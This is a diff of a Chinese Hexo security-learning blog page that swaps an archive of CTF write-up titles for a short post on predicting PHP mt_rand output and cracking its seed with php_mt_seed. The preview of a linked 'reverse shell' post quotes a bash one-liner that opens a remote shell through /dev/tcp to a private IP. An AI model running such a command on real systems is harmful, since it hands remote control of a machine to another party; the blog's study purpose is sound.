@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive: 2021 - Hexo</title>
+  <title>php-伪随机数爆破 - Hexo</title>
   
 
   
@@ -56,7 +54,7 @@
 <body>
   
 
-<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -307,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -383,466 +381,259 @@
         
 
 <div class='l_main'>
-	
-		
-  <section class="post-list">
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
     
     
+    
+      <h1 class="title">
+        php-伪随机数爆破
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 17, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/18/VNCTF-EZ-GAME/">
-        VNCTF-EZ-GAME
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>打开又是一个游戏，咋都这么爱出游戏，上次HCTF的大西瓜，这次的这个又是一头雾水</p>
-    
+      <div id="lc-pv" data-title="php-伪随机数爆破" data-path="/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-18</time>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <a id="more"></a>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107302795?utm_source=app&app_version=4.5.8">参考地址</a></p>
+<p><code>计算机只能产生伪随机数不能产生绝对随机的随机数</code></p>
+<h2>与伪随机数有关的两个函数</h2>
+
+<li>mt_rand()
+
+<blockquote>
+<p>mt_rand(min,max),如果没有提供min和max,返回0到RAND-MAX之间对的伪随机数</p>
+</blockquote>
+<li>mt_scand()
+
+<blockquote>
+<p>mt_scand(seed),seed:规定播种值，用seed来给随机数发生器播种</p>
+</blockquote>
+<p><img src="1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,666"></p>
+<p>可以发现，如果我们把mt_scand()中的seed设置为一个固定的值，那么生成的随机数的是一样，在php 4.2之后，php会自动播种种子，所以我们无需设置</p>
+<h2>php伪随机数的安全</h2>
+
+<li>可预测性
+
+<p><mark>伪随机是由可确定的函数，通过一个种子（常用时钟）播种，产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，或者已知产生的随机数的一部分，都可能获得接下来随机数序列的信息，知道了你的随机数序列，就可以确定你的种子值。 （可预测性）。</p>
+<p>简单假设一下 mt_rand()内部生成随机数的函数为: rand = seed+(i10) 其中 seed 是随机数种子， i 表示第几次调用这个随机数函数。当我们同时知道 i 和 rand 两个值的时候，就能很容易的算出seed的值来。比如 rand=21 , i=2 代入函数 21=seed+(20) 就能得到 seed=1 。是不是很简单，当我们拿到seed之后，就能计算出当 i 为任意值时候的 rand 的值了。</mark></p>
+<h2>php自动播种</h2>
+
+<p>当php 4.2.0的时候，播种是由系统自动完成的，php每次调用mt_rand()函数的时候，都会先检查是否已经播种，如果播种就直接产生随机数，否则调用php_mt_srand来播种。在每个进程中，只有第一次调用mt_rand()会播种，接下来会根据这个第一次播种的种子来生成随机数</p>
+<h2>种子爆破工具-php_mt_seed</h2>
+
+<p>它可以根据单次mt_rand()的输出结果直接爆破出可能的种子，当然也可以爆破类似mt_rand(1,100)这样限定了MIN MAX输出的种子。</p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2021/03/18/VNCTF-EZ-GAME/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/>http://ckylsy.github.io/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-17T11:20:27+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 17, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/17/Ezpop/">
-        MIS  Ezpop
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>这题的代码太长了，基础太差实在审不下去</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-17</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/17/Ezpop/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+          
 
-</div>
-
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/15/267-270/">
-        ctfshow  267-270
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-15</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/15/267-270/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/14/buueasypop/">
-        buueasypop
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>第一次做的时候，搞得不是特别懂，现在把题目在细细的扣一扣</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-14</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/14/buueasypop/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/14/mai/">
-        henu mai
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>学习反序列化之后，打开了那道上星期让我头蒙了3个小时的题目，其实现在看还挺简单的，主要当时就没有听说过pop链这个词就。</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-14</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/14/mai/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/">
-        反序列化 ctfshow 265
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-12</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/">
-        反序列化 ctfshow 263 264
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-11</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        反序列化 ctfshow 258，259，260，261
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-10</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/08/pop%E9%93%BE/">
-        ezpop
-      </a>
-    </h2>
-  
-  <div class='md'>
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        
-
-#前言
-今天又是做不出来题目的一天
-
-
-
-POP链逆向分析
-
-
-
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/&title=php-伪随机数爆破 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/&title=php-伪随机数爆破 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/&title=php-伪随机数爆破 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-08</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/08/pop%E9%93%BE/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/08/henuctf/">
-        henuctf
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>我知道我很菜，但昨天我意识到了我还不是一般的菜</p>
-    
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-08</time>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2021/03/08/henuctf/'>
-            Read More
-          </a>
-        </div>
+        <a class='prev' href='/2021/04/19/XXE/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>XXE</p>
+          <p class='content'>#前言
+转载，XXE详解，
+从XML相关一步一步到XXE漏洞
+
+
+XML
+这个我记得招新考试中有这个xml注入，说来惭愧这么长时间还是对这个没有什么了解
+
+什么是xml
+
+xml是可扩展标记语言...</p>
+        </a>
+      
+      
+        <a class='next' href='/2021/04/10/%E5%8F%8D%E5%BC%B9shell/'>
+          <p class='title'>反弹shell<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+bash反弹shell
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.24.133/8080 0&gt; &amp;1
+
+bash一句话命令详解
+
+bash产生了...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/archives/2021/page/2/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          3 / 9
-        </p>
-        
-          <a class="next" rel="next" href="/archives/2021/page/4/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -850,87 +641,28 @@ POP链逆向分析
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
+  <header>
     
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
 
-  
 
-  
-    
-    
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">与伪随机数有关的两个函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">php伪随机数的安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">php自动播种</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">种子爆破工具-php_mt_seed</span></a></li></ol>
+    </div>
+  </section>
 
-  
 
   
 
 
 </aside>
+
 
 
         
@@ -940,14 +672,14 @@ POP链逆向分析
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="php-伪随机数爆破";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
 </script>
 
